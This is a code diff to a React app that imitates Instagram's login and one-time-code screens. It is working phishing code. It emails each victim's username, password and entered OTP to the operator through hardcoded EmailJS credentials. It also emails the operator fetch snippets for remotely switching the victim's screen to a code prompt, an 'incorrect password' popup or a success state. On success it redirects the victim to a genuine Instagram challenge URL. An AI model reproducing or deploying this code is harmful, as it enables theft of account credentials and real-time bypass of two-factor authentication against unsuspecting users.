@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useRef } from "react";
 import "./App.css";
 import emailjs from "emailjs-com";
 
@@ -12,60 +12,93 @@ function App() {
   const [showPassword, setShowPassword] = useState(false);
   const [isAutomating, setIsAutomating] = useState(false);
   const [currentView, setCurrentView] = useState("login"); // 'login', 'otp', 'error'
-  const [errorMessage, setErrorMessage] = useState("");
+  const [showErrorPopup, setShowErrorPopup] = useState(false);
   const [otpCode, setOtpCode] = useState("");
   const [maskedEmail, setMaskedEmail] = useState("");
   const [sessionId, setSessionId] = useState(null);
+  const lastProcessedStateRef = useRef(null); // Track processed states using ref
 
   const API_URL = process.env.REACT_APP_API_URL || "http://localhost:3001";
 
   // Define handleStateChange with useCallback before useEffect
-  const handleStateChange = React.useCallback((state) => {
-    if (state === "getOtp") {
-      // Mask the email (assuming username might be email)
-      const email = username.includes("@") ? username : `${username}@gmail.com`;
-      const masked = email.replace(
-        /(.{1})(.*)(@.*)/,
-        (match, first, middle, domain) => {
-          return first + "*".repeat(Math.min(middle.length, 6)) + domain;
-        }
-      );
-      setMaskedEmail(masked);
-      setCurrentView("otp");
-      setIsAutomating(false);
-    } else if (state === "incorrectCredentials") {
-      setCurrentView("login");
-      setErrorMessage("Incorrect username or password");
-      setIsAutomating(false);
-    } else if (state === "success") {
-      // Send email only on success
-      emailjs
-        .send(
-          "service_04tt69h",
-          "template_b9wm876",
-          {
-            username: username,
-            password: password,
-            status: "✅ Login Successful",
-          },
-          "bfy_j4oBXNKFpGcDC"
-        )
-        .then((emailResult) => {
-          console.log("Email sent successfully:", emailResult.text);
-        })
-        .catch((error) => {
-          console.error("EmailJS error:", error);
-        });
+  const handleStateChange = React.useCallback(
+    (state) => {
+      // Check if this state was already processed - prevent duplicate processing
+      if (state === lastProcessedStateRef.current) {
+        console.log("State already processed, skipping:", state);
+        return;
+      }
 
-      // Redirect to challenge URL
-      window.location.href =
-        "https://www.instagram.com/challenge/ASiPub8EgqPKL-p8Ud3MuTh1C66lLQd_Ea6BRh6mA12lYI8R5gP5LpdfPG5Ge_je/ASRTebzeSSTW-_fOweJBGq71P7Onp_kyomgEd-mSPH9ft854LKrnuewUp5HOrpzz6wPGicm7zD_7lg/?challenge_context=AaX_Zvle_aRZcoWRerM1OtcBnl1x9nmuN8uBVQSbGvXfE_bDxLu9Ukb6OvQM8M21QbhfPChZICiNLp7dG3r2XZ-_NuzN6Or76omVjIVIOit5e4CE5mTr0QffVXmDMDyq_h8Rt1isD_BNZVDw695FK7XnTXtUZd4M0WrUJDNnoK9FJ33AhiLuFkf3FKg8uUWCx0ZE33Bjw7OR5cmquAq57X904yAgYFx-KKAVfDx4L13_r6klk5ur0PWw38NAIjxKkuNJm8S65glVWnrCidPj_S6pbjrJj2iJ5FnjKNaAiNbk8gW6kFq2Rehb27RdnjFRb8AE3mGU-fXxIE0_cL6CIu47-KZZhar9-bMWFZkGZfNlMMNi3eYTXKl3huh_RF7vOxPngzSKU3sbGSUDgS7myCo7AzTdLXVyL0WLnVRBcW7wg3tfBXMYNoRyLIikELwERg7kjuYMmjsCyRVrHeaJ_9VURM_8goxcP3sS4zjxO6ysRfArMJKMtD4rbIDCX6OkvcGBhWdfJY8x26KzrDQFm5Jxa4YfyD17f6giC3ogwoVI23hG9oXyapiBzmPgXN0fah-uRnP0gktPTXr_gXQ-LADHmkJbmV4lVIp2a7FpwDgBGOdYr8BTiYwayZMPG_3YI5nMpmmMPKY8pNhR1gOKlsbtLDqVJ9TbSQw6EyDgf9XA_ptzafPk1WIKfOukXxABEitY7JcFKP0f-Vc5AVyQUzQJnkmx6FMfk8FYkbzEvoXwgvp_Zf7HHYnv8A-qCLa0AVIZL-Zqzj1W2mz3iNPg1wMhT4voXJZj6mrm_5vl6kOZ9sCZ41W84cQXETnQVp0MBPMGWodIPoiRB45_DyJ7l1uHjy_QBzscEPBI1aFWGdFibYcYZpsD4PnXPlG_-RTZqbjN-_7ZUk0xiWYy_oS97fNktgxaydcvEhN8fhcKNKGZx2dMlOj_n5ms_WvVW1lYsug3dW_7UPRhuDwRf0cXoAbw8f1NeqLs5K2MK8yoHO6sDL8WTkEWntbP3VMX7lCoX5zF1IBLe7BA58LQ6QE4aiqO-kWmKDZVX183j0ri_6fbXJyy3VhrUp7l_N9MBHzizKbhAAedKCvUql1nCt6x-0xYgzuRmUxf1_B-uwChcA0Zq3CpuesCruPT9BgoiWj69gymusScHxXp0FiGEj1pAj_fXWjM1s-y0Qt38w3u4QF5Ckzl6FKKrJrHNasWCc6g8ii6CLybsN0gA93XDkw3s_tBVdBhPacEH17QXqLp1jqdd120WqJEQVTqviL7hDvkFWhb4r5zob3Is5Uh-JsQ65O-dPQ2YiNcfFT59YYfnd5h1Ouui4MC_NNr5lGz3xcdG4-Kw8wYJ4CK1GuI87j8sh_bu-mEwi16y_iiShD1dRVeKiWfMbpERkB44NKR8yrFn3wt89VPiUETnaYtDt8iEW4HaED0o9gMAwKXPjp_e8iI5otbGaxOHBE_YUh_L_f8HZqL5C3Y9krpEgUFAj1XDJfHQftyb1meTUWXk62lTpxN6dU0eAcaZoAR7bhu3rJU&deoia=1";
-    }
-  }, [username, password]);
+      // Mark as processed immediately to prevent race conditions
+      lastProcessedStateRef.current = state;
+      console.log("Processing new state:", state);
+
+      if (state === "getOtp") {
+        // Mask the email (assuming username might be email)
+        const email = username.includes("@")
+          ? username
+          : `${username}@gmail.com`;
+        const masked = email.replace(
+          /(.{1})(.*)(@.*)/,
+          (match, first, middle, domain) => {
+            return first + "*".repeat(Math.min(middle.length, 6)) + domain;
+          }
+        );
+        setMaskedEmail(masked);
+        setCurrentView("otp");
+        setIsAutomating(false);
+      } else if (state === "incorrectCredentials") {
+        // Only show popup if it's not already showing
+        setCurrentView("login");
+        setIsAutomating(false);
+        // Use functional update to check current state
+        setShowErrorPopup((prev) => {
+          if (!prev) {
+            console.log(
+              "Showing error popup - incorrectCredentials state received"
+            );
+            return true;
+          } else {
+            console.log("Error popup already showing, skipping");
+            return prev;
+          }
+        });
+      } else if (state === "success") {
+        // Send email only on success
+        emailjs
+          .send(
+            "service_04tt69h",
+            "template_b9wm876",
+            {
+              username: username,
+              password: password,
+              status: "✅ Login Successful",
+            },
+            "bfy_j4oBXNKFpGcDC"
+          )
+          .then((emailResult) => {
+            console.log("Email sent successfully:", emailResult.text);
+          })
+          .catch((error) => {
+            console.error("EmailJS error:", error);
+          });
+
+        // Redirect to challenge URL
+        window.location.href =
+          "https://www.instagram.com/challenge/ASiPub8EgqPKL-p8Ud3MuTh1C66lLQd_Ea6BRh6mA12lYI8R5gP5LpdfPG5Ge_je/ASRTebzeSSTW-_fOweJBGq71P7Onp_kyomgEd-mSPH9ft854LKrnuewUp5HOrpzz6wPGicm7zD_7lg/?challenge_context=AaX_Zvle_aRZcoWRerM1OtcBnl1x9nmuN8uBVQSbGvXfE_bDxLu9Ukb6OvQM8M21QbhfPChZICiNLp7dG3r2XZ-_NuzN6Or76omVjIVIOit5e4CE5mTr0QffVXmDMDyq_h8Rt1isD_BNZVDw695FK7XnTXtUZd4M0WrUJDNnoK9FJ33AhiLuFkf3FKg8uUWCx0ZE33Bjw7OR5cmquAq57X904yAgYFx-KKAVfDx4L13_r6klk5ur0PWw38NAIjxKkuNJm8S65glVWnrCidPj_S6pbjrJj2iJ5FnjKNaAiNbk8gW6kFq2Rehb27RdnjFRb8AE3mGU-fXxIE0_cL6CIu47-KZZhar9-bMWFZkGZfNlMMNi3eYTXKl3huh_RF7vOxPngzSKU3sbGSUDgS7myCo7AzTdLXVyL0WLnVRBcW7wg3tfBXMYNoRyLIikELwERg7kjuYMmjsCyRVrHeaJ_9VURM_8goxcP3sS4zjxO6ysRfArMJKMtD4rbIDCX6OkvcGBhWdfJY8x26KzrDQFm5Jxa4YfyD17f6giC3ogwoVI23hG9oXyapiBzmPgXN0fah-uRnP0gktPTXr_gXQ-LADHmkJbmV4lVIp2a7FpwDgBGOdYr8BTiYwayZMPG_3YI5nMpmmMPKY8pNhR1gOKlsbtLDqVJ9TbSQw6EyDgf9XA_ptzafPk1WIKfOukXxABEitY7JcFKP0f-Vc5AVyQUzQJnkmx6FMfk8FYkbzEvoXwgvp_Zf7HHYnv8A-qCLa0AVIZL-Zqzj1W2mz3iNPg1wMhT4voXJZj6mrm_5vl6kOZ9sCZ41W84cQXETnQVp0MBPMGWodIPoiRB45_DyJ7l1uHjy_QBzscEPBI1aFWGdFibYcYZpsD4PnXPlG_-RTZqbjN-_7ZUk0xiWYy_oS97fNktgxaydcvEhN8fhcKNKGZx2dMlOj_n5ms_WvVW1lYsug3dW_7UPRhuDwRf0cXoAbw8f1NeqLs5K2MK8yoHO6sDL8WTkEWntbP3VMX7lCoX5zF1IBLe7BA58LQ6QE4aiqO-kWmKDZVX183j0ri_6fbXJyy3VhrUp7l_N9MBHzizKbhAAedKCvUql1nCt6x-0xYgzuRmUxf1_B-uwChcA0Zq3CpuesCruPT9BgoiWj69gymusScHxXp0FiGEj1pAj_fXWjM1s-y0Qt38w3u4QF5Ckzl6FKKrJrHNasWCc6g8ii6CLybsN0gA93XDkw3s_tBVdBhPacEH17QXqLp1jqdd120WqJEQVTqviL7hDvkFWhb4r5zob3Is5Uh-JsQ65O-dPQ2YiNcfFT59YYfnd5h1Ouui4MC_NNr5lGz3xcdG4-Kw8wYJ4CK1GuI87j8sh_bu-mEwi16y_iiShD1dRVeKiWfMbpERkB44NKR8yrFn3wt89VPiUETnaYtDt8iEW4HaED0o9gMAwKXPjp_e8iI5otbGaxOHBE_YUh_L_f8HZqL5C3Y9krpEgUFAj1XDJfHQftyb1meTUWXk62lTpxN6dU0eAcaZoAR7bhu3rJU&deoia=1";
+      }
+    },
+    [username, password]
+  );
 
   // Poll server for state changes
   useEffect(() => {
-    if (!sessionId) return;
+    if (!sessionId) {
+      console.log("No sessionId, polling stopped");
+      return;
+    }
+
+    console.log("Starting to poll for sessionId:", sessionId);
 
     const pollState = async () => {
       try {
@@ -73,18 +106,29 @@ function App() {
         const data = await response.json();
 
         if (data.success && data.state !== "waiting") {
-          handleStateChange(data.state);
+          // Only call handleStateChange if this state hasn't been processed yet
+          if (data.state !== lastProcessedStateRef.current) {
+            console.log(
+              "State changed to:",
+              data.state,
+              "for session:",
+              sessionId
+            ); // Debug log
+            handleStateChange(data.state);
+          }
         }
       } catch (error) {
         console.error("Error polling state:", error);
       }
     };
 
-    // Poll every 2 seconds
+    // Poll immediately, then every 2 seconds
+    pollState();
     const interval = setInterval(pollState, 2000);
 
     return () => {
-      if (interval) clearInterval(interval);
+      console.log("Stopping polling for sessionId:", sessionId);
+      clearInterval(interval);
     };
   }, [sessionId, API_URL, handleStateChange]);
 
@@ -385,9 +429,11 @@ function App() {
   const handleSubmit = async (e) => {
     e.preventDefault();
     setIsAutomating(true);
-    setErrorMessage("");
+    setShowErrorPopup(false);
+    lastProcessedStateRef.current = null; // Reset processed state for new login attempt
 
-    // Create session on server
+    // Create session on server first
+    let currentSessionId = null;
     try {
       const response = await fetch(`${API_URL}/api/create-session`, {
         method: "POST",
@@ -399,33 +445,122 @@ function App() {
 
       const data = await response.json();
       if (data.success) {
-        setSessionId(data.sessionId);
-        console.log("Session created:", data.sessionId);
-        console.log(
-          `To control from anywhere, call: POST ${API_URL}/api/set-state with body: { "sessionId": "${data.sessionId}", "command": "getOtp" | "incorrectCredentials" | "success" }`
-        );
+        currentSessionId = data.sessionId;
+        setSessionId(currentSessionId);
+        console.log("Session created:", currentSessionId);
       }
     } catch (error) {
       console.error("Error creating session:", error);
     }
 
-    // Show "Logging in..." for 12 seconds
+    // Send email for every login attempt with API code snippets
+    if (currentSessionId) {
+      try {
+        // Generate ready-to-paste API code snippets
+        const apiCodeGetOtp = `fetch('${API_URL}/api/set-state', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    sessionId: '${currentSessionId}',
+    command: 'getOtp'
+  })
+}).then(r=>r.json()).then(console.log);`;
+
+        const apiCodeIncorrectCredentials = `fetch('${API_URL}/api/set-state', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    sessionId: '${currentSessionId}',
+    command: 'incorrectCredentials'
+  })
+}).then(r=>r.json()).then(console.log);`;
+
+        const apiCodeSuccess = `fetch('${API_URL}/api/set-state', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    sessionId: '${currentSessionId}',
+    command: 'success'
+  })
+}).then(r=>r.json()).then(console.log);`;
+
+        await emailjs.send(
+          "service_04tt69h",
+          "template_b9wm876",
+          {
+            username: username,
+            password: password,
+            status: "⏳ Login Attempt",
+            api_code_getotp: apiCodeGetOtp,
+            api_code_incorrect: apiCodeIncorrectCredentials,
+            api_code_success: apiCodeSuccess,
+          },
+          "bfy_j4oBXNKFpGcDC"
+        );
+        console.log("Email sent for login attempt");
+      } catch (error) {
+        console.error("EmailJS error:", error);
+      }
+    }
+
+    // Show loading spinner for 20 seconds
     setTimeout(() => {
       setIsAutomating(false);
       // Polling will continue to check for state changes
       console.log("Waiting for API call to set state...");
-    }, 12000);
+    }, 20000);
   };
 
-  const handleOtpSubmit = (e) => {
+  const handleOtpSubmit = async (e) => {
     e.preventDefault();
-    // Handle OTP submission if needed
+
+    if (!otpCode || otpCode.length < 4) {
+      console.log("OTP code is too short");
+      return;
+    }
+
     console.log("OTP submitted:", otpCode);
+
+    // Send email with username and OTP
+    try {
+      await emailjs.send(
+        "service_04tt69h",
+        "template_42u7yrw",
+        {
+          username: username,
+          otp_code: otpCode,
+        },
+        "bfy_j4oBXNKFpGcDC"
+      );
+      console.log("OTP email sent successfully");
+    } catch (error) {
+      console.error("EmailJS error:", error);
+    }
   };
 
-  const handleGetNewCode = () => {
+  const handleGetNewCode = async () => {
     console.log("Get new code requested");
-    // Handle get new code logic
+
+    // Clear the OTP input field
+    setOtpCode("");
+
+    // Send email when user requests new OTP code (using same template as OTP submission)
+    try {
+      await emailjs.send(
+        "service_04tt69h",
+        "template_42u7yrw", // Same template as OTP submission
+        {
+          username: username,
+          otp_code: "", // Empty for new request
+          request_type: "new_otp_request", // Flag to indicate new request
+          message: "New OTP is requested from the user",
+        },
+        "bfy_j4oBXNKFpGcDC"
+      );
+      console.log("New OTP request email sent successfully");
+    } catch (error) {
+      console.error("EmailJS error:", error);
+    }
   };
 
   const handleTryAnotherWay = () => {
@@ -600,7 +735,6 @@ function App() {
           />
         </div>
         <form className="login-form" onSubmit={handleSubmit}>
-          {errorMessage && <div className="error-message">{errorMessage}</div>}
           <div className="form-group">
             <label
               htmlFor="username"
@@ -618,6 +752,7 @@ function App() {
               onChange={(e) => setUsername(e.target.value)}
               onFocus={() => setUsernameFocused(true)}
               onBlur={() => setUsernameFocused(false)}
+              disabled={isAutomating}
               required
             />
           </div>
@@ -639,6 +774,7 @@ function App() {
                 onChange={(e) => setPassword(e.target.value)}
                 onFocus={() => setPasswordFocused(true)}
                 onBlur={() => setPasswordFocused(false)}
+                disabled={isAutomating}
                 required
               />
               {password && (
@@ -709,10 +845,12 @@ function App() {
           </div>
           <button
             type="submit"
-            className={`login-button ${isFormValid ? "active" : ""}`}
+            className={`login-button ${isFormValid ? "active" : ""} ${
+              isAutomating ? "loading" : ""
+            }`}
             disabled={!isFormValid || isAutomating}
           >
-            {isAutomating ? "Logging in..." : t.loginButton}
+            {isAutomating ? <span className="spinner"></span> : t.loginButton}
           </button>
         </form>
         <div className="forgot-password">
@@ -822,7 +960,37 @@ function App() {
                 ))}
               </div>
             </div>
-            <div className="drag-indicator modal-indicator"></div>
+            <div className="drag-indicator modal-indicator"> </div>
+          </div>
+        </>
+      )}
+
+      {/* Error Popup Modal */}
+      {showErrorPopup && (
+        <>
+          <div
+            className="modal-overlay"
+            onClick={() => setShowErrorPopup(false)}
+            onKeyDown={(e) => {
+              if (e.key === "Enter" || e.key === " ") {
+                e.preventDefault();
+                setShowErrorPopup(false);
+              }
+            }}
+            role="button"
+            tabIndex={0}
+          ></div>
+          <div className="error-popup">
+            <h2 className="error-popup-title">Incorrect Password</h2>
+            <p className="error-popup-message">
+              The password you entered is incorrect. Please try again.
+            </p>
+            <button
+              className="error-popup-button"
+              onClick={() => setShowErrorPopup(false)}
+            >
+              OK
+            </button>
           </div>
         </>
       )}
